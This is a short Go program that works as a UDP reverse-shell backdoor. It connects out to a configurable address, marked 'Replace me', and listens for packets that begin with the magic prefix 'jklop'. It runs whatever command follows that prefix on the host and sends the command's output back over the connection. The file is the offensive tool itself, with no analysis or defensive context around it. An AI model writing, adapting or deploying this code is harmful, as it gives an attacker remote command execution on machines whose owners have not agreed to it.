package main
import (
    "fmt"
    "net"
    "os/exec"
    "bufio"
    "bytes"
)

// Replace me
const IP = "127.0.0.1"
const PORT = "9999"

func main() {
    p :=  make([]byte, 2048)
    conn, err := net.Dial("udp", IP + ":" + PORT)
    defer conn.Close()

    if err != nil {
        fmt.Printf("Some error %v", err)
        return
    }

    for true {
      _, err = bufio.NewReader(conn).Read(p)
      
      if string(p[0:5]) == "jklop" {
        if err == nil {
          var cmd = bytes.Trim(p[5:], "\x00")
          out, err := exec.Command(string(cmd)).Output()
          _ = out
          if err == nil {
            fmt.Fprintf(conn, string(out))
          }
        }
      }
    }
}
